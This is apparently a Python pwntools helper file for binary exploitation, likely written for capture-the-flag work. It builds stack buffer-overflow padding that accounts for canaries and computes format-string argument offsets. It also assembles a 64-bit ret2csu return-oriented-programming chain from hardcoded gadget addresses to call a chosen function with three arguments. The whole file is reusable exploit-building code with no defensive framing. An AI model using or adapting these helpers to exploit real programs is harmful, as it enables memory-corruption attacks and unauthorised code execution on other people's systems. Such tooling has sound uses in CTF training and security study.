from pwn import *
def payloadBase(paddingToRBP, systemBits, canary=""):
    if systemBits == 32:
        rbpPadding = b"_rbp"
    elif systemBits == 64:
        rbpPadding = b"_old_rbp"
    else:
        error("system bits must be 32 or 64.")
    if canary=="":
        return b"A"*paddingToRBP + rbpPadding
    else:
        return b"A"*(paddingToRBP-int(systemBits/8)) +canary+ rbpPadding

def formatArg(offsetToRSP, systemBits):
    if systemBits == 32:
        return (offsetToRSP / 4) + 1
    elif systemBits == 64:
        return (offsetToRSP / 8) + 6
    else:
        error("system bits must be 32 or 64.")

common_gadget_1 = 0x40075A
common_gadget_2 = 0x400740

def payloadContent_Common_Gadget(next_addr, func_to_call, arg0, arg1, arg2):
    payload = b""
    payload += p64(common_gadget_1)
    payload += p64(0)
    payload += p64(1)
    payload += p64(func_to_call)
    payload += p64(arg2)
    payload += p64(arg1)
    payload += p64(arg0)
    payload += p64(common_gadget_2)
    payload += p64(0xdeadbeef)*7
    payload += p64(next_addr)
    return payload
